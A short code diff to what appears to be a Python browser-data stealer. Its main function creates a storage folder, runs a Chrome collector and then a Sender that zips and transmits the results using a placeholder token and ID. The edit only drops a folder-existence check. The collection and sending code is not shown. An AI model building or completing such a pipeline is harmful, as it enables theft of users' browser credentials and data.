@@ -59,8 +59,7 @@ storage_folder = "files/"
 
 def main():
 
-    if not path.exists(storage_path + storage_folder):
-        mkdir(storage_path + storage_folder)
+    mkdir(storage_path + storage_folder)
 
     Chrome(storage_path, storage_folder).run()
     Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID).run()
